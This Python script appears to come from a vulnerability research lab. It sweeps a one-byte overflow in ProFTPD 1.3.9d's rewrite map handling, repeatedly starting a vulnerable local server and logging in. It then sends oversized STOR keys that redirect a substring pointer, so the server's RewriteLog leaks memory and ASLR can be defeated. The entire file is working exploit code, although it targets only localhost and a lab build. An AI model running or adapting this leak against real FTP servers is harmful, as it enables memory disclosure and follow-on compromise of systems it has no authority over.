#!/usr/bin/env python3
"""Sweep the one-byte ASLR-on substr redirect and capture raw RewriteLog lines.

Each iteration starts a fresh plain 1.3.9d server (ASLR on), logs in, sends two
STOR commands with a 1025-code-point key whose first code point's low byte is
the swept byte. The first STOR's overflow changes only substr[0]; the second
STOR's rewrite_parse_map_str() logs the redirected pointer with %s. Raw parse
lines are written to evidence/substr-leak-sweep.txt with the swept byte.
"""
import io
import os
import re
import socket
import subprocess
import sys
import time
import ftplib

W = os.path.dirname(os.path.abspath(__file__))
CFG = W + "/etc/proftpd-leak.conf"
BIN = W + "/../proftpd-vuln-plain"
LOG = W + "/log/rewrite-leak.log"
OUT = W + "/evidence/substr-leak-sweep.txt"


def wait_port(port, timeout=8):
    end = time.time() + timeout
    while time.time() < end:
        try:
            s = socket.create_connection(("127.0.0.1", port), 0.3)
            s.close()
            return True
        except OSError:
            time.sleep(0.05)
    return False


def probe(byte):
    open(LOG, "wb").close()
    with open(W + "/log/leak-sweep-server.out", "wb") as out:
        srv = subprocess.Popen([BIN, "-n", "-c", CFG], cwd=W,
                               stdout=out, stderr=subprocess.STDOUT)
        try:
            if not wait_port(21904):
                return [("NO_SERVER", b"")]
            key = chr(byte) + "A" * 1024
            ftp = ftplib.FTP()
            try:
                ftp.connect("127.0.0.1", 21904, timeout=5)
                ftp.login("labuser", "labpass")
                ftp.set_pasv(True)
                ftp.sock.settimeout(5)
                for _ in range(2):
                    try:
                        ftp.storbinary("STOR " + key, io.BytesIO(b"z" * 16))
                    except Exception:
                        pass
                try:
                    ftp.voidcmd("NOOP")
                except Exception:
                    pass
            except Exception:
                pass
            finally:
                try:
                    ftp.close()
                except Exception:
                    pass
            time.sleep(0.1)
            with open(LOG, "rb") as f:
                data = f.read()
        finally:
            srv.terminate()
            try:
                srv.wait(timeout=3)
            except subprocess.TimeoutExpired:
                srv.kill()
    lines = [ln for ln in data.split(b"\n") if b"parsing '" in ln]
    return [(hex(byte), ln) for ln in lines]


def main():
    lo = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    hi = int(sys.argv[2]) if len(sys.argv) > 2 else 255
    with open(OUT, "ab") as f:
        for b in range(lo, hi + 1):
            for tag, line in probe(b):
                f.write(tag.encode() + b" " + line + b"\n")
            if b % 16 == 0:
                f.flush()
                print("swept", hex(b), file=sys.stderr)


if __name__ == "__main__":
    main()
